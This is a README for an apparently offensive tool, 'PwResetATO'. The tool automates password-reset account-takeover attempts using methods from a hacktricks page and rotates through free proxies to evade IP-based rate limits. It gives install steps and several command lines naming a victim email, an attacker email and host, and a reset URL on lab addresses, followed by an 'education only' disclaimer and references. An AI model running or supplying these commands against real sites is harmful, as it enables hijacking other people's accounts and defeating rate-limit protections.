# PwResetATO

## Password Reset Brute force with ip rotation

This tool is a simple brute force that implements the hacktricks methodology in reset password.
The tool comes with ip rotation also to bypass ip based rate limit.

There are 2 script included. 1 for getting proxy list on https://free-proxy-list.net and the other is for checking the password reset

### Installation

Run the command below to install the required libraries used in the tool.
* pip3
  ```sh
  pip3 install -r requirements.txt
  ```
  
### Usage

Tool usage.
* pip3
  ```sh
  python3 test.py -vm 'victim@email.com' -tm 'attacker@email.com' -p email -ah 10.0.2.15 -u http://10.0.2.2/ResetPassword.php
  python3 test.py -vm 'victim@email.com' -p email -to tokenvlue -top token -u http://10.0.2.2/ResetPassword.php
  
  for IP rotation
  python3 test.py -vm 'victim@email.com' -tm 'attacker@email.com' -p email -ah 10.0.2.15 -e -u http://10.0.2.2/ResetPassword.php
  
  ```

# Disclaimer
```sh
The tool is for education purpose only. Usage of the tool for attacking the website without consent is illegal. 
The end user of the tool will be responsible for the damage it might cause.
The developer of the tool assume no liability and not responsbile for any misuse and damage.
```

## Authors

[anantha](https://github.com/Ananthavijay)

[damaidec](https://medium.com/@damaidec)

#### References
```sh
https://book.hacktricks.xyz/pentesting-web/reset-password
https://hackerone.com/reports/819930
https://rhinosecuritylabs.com/aws/bypassing-ip-based-blocking-aws/
https://www.pluralsight.com/guides/extracting-data-html-beautifulsoup
https://www.thepythoncode.com/article/using-proxies-using-requests-in-python
```
